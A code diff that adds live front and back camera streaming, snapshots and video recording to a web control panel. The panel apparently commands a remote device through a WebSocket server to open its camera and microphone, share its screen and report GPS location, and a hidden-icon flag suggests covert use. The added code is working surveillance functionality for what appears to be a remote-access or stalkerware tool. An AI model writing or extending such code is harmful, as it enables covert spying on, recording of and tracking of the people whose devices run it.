@@ -323,6 +323,12 @@
         <button onclick="toggleBackCam()"><span>📷</span> <span id="backCamBtn">Back Camera</span></button>
         <button onclick="toggleMic()"><span>🎤</span> <span id="micBtn">Start Mic</span></button>
         <button onclick="send('getLocation')"><span>📍</span> GPS Location</button>
+        <button onclick="toggleLiveCam('front')"><span>📹</span> <span id="liveFrontBtn">Live Front Cam</span></button>
+        <button onclick="toggleLiveCam('back')"><span>📹</span> <span id="liveBackBtn">Live Back Cam</span></button>
+        <button onclick="stopLiveCam()" style="display:none;" id="stopLiveCamBtn">⏹ Stop Live Cam</button>
+        <button onclick="snapshot()">📸 Snapshot</button>
+        <button onclick="startRecording()">⏺ Record</button>
+        <button onclick="stopRecording()">⏹ Stop Record</button>
     </div>
 
     <div class="section">
@@ -353,10 +359,16 @@
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
+
     // ---------- CONFIG ----------
     const WS_URL = "wss://mirror-view.onrender.com";
 
     // ---------- GLOBALS ----------
+    let liveCamPC = null;
+    let liveCamStream = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let currentLiveCam = null; // 'front' or 'back'
     let ws;
     let pc = null;                     // WebRTC peer
     let mapInstance = null;
@@ -375,7 +387,130 @@
     let iconHidden = false;
 
     const panel = document.getElementById('main-panel');
+    function toggleLiveCam(camera) {
+    if (liveCamPC) {
+        stopLiveCam();
+    } else {
+        startLiveCam(camera);
+    }
+}
 
+function startLiveCam(camera) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+        alert('Not connected');
+        return;
+    }
+    currentLiveCam = camera;
+    panel.innerHTML = '<video id="liveCamVideo" autoplay playsinline></video>';
+    liveCamPC = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    liveCamPC.ontrack = (e) => {
+        liveCamStream = e.streams[0];
+        document.getElementById('liveCamVideo').srcObject = liveCamStream;
+    };
+    liveCamPC.onicecandidate = (e) => {
+        if (e.candidate) {
+            ws.send(JSON.stringify({
+                type: 'ICE_CANDIDATE',
+                candidate: e.candidate.candidate,
+                sdpMid: e.candidate.sdpMid,
+                sdpMLineIndex: e.candidate.sdpMLineIndex
+            }));
+        }
+    };
+    // Send command to device
+    ws.send(JSON.stringify({
+        type: 'COMMAND',
+        command: 'START_CAMERA_STREAM',
+        requestId: generateRequestId(),
+        params: { camera: camera }
+    }));
+    // Update UI
+    document.getElementById('liveFrontBtn').parentElement.style.display = 'none';
+    document.getElementById('liveBackBtn').parentElement.style.display = 'none';
+    document.getElementById('stopLiveCamBtn').style.display = 'block';
+}
+
+function stopLiveCam() {
+    if (liveCamPC) {
+        liveCamPC.close();
+        liveCamPC = null;
+        liveCamStream = null;
+    }
+    ws.send(JSON.stringify({ type: 'COMMAND', command: 'STOP_CAMERA_STREAM', requestId: generateRequestId() }));
+    document.getElementById('liveFrontBtn').parentElement.style.display = 'block';
+    document.getElementById('liveBackBtn').parentElement.style.display = 'block';
+    document.getElementById('stopLiveCamBtn').style.display = 'none';
+    panel.innerHTML = 'Ready.';
+}
+
+// Handle incoming camera offer
+function handleCameraOffer(msg) {
+    if (!liveCamPC) {
+        console.error('No live camera peer connection');
+        return;
+    }
+    const offer = new RTCSessionDescription({ type: 'offer', sdp: msg.sdp });
+    liveCamPC.setRemoteDescription(offer)
+        .then(() => liveCamPC.createAnswer())
+        .then(answer => liveCamPC.setLocalDescription(answer))
+        .then(() => {
+            ws.send(JSON.stringify({
+                type: 'ANSWER',
+                requestId: msg.requestId,
+                sdp: liveCamPC.localDescription.sdp
+            }));
+        })
+        .catch(e => console.error('Error handling camera offer:', e));
+}
+
+// Snapshot from live video
+function snapshot() {
+    const video = document.getElementById('liveCamVideo');
+    if (!video) {
+        alert('No live camera active');
+        return;
+    }
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `snapshot_${Date.now()}.png`;
+        a.click();
+        URL.revokeObjectURL(url);
+    }, 'image/png');
+}
+
+// Recording (MediaRecorder)
+function startRecording() {
+    if (!liveCamStream) {
+        alert('No live camera active');
+        return;
+    }
+    recordedChunks = [];
+    mediaRecorder = new MediaRecorder(liveCamStream);
+    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
+    mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `recording_${Date.now()}.webm`;
+        a.click();
+        URL.revokeObjectURL(url);
+    };
+    mediaRecorder.start();
+    alert('Recording started');
+}
+
+function stopRecording() {
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+    }
+}
     // ---------- CONNECTION (with dual message handling) ----------
     function connect() {
         ws = new WebSocket(WS_URL);
@@ -463,6 +598,9 @@
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 showNotification('Screen share started');
                 break;
+            case 'CAMERA_OFFER':
+                handleCameraOffer(msg);
+                break;
             case 'SCREEN_SHARE_STOPPED':
                 screenActive = false;
                 document.getElementById('screenBtn').innerText = 'Start Screen';
@@ -473,7 +611,9 @@
                 console.log('Unhandled JSON type:', json.type);
         }
     }
-
+    function generateRequestId() {
+    return 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+    }
     // ---------- PLAIN TEXT HANDLER (legacy) ----------
     function handlePlainText(msg) {
         if (msg.startsWith("STATUS:")) {
@@ -916,3 +1056,4 @@
 </script>
 </body>
 </html>
+
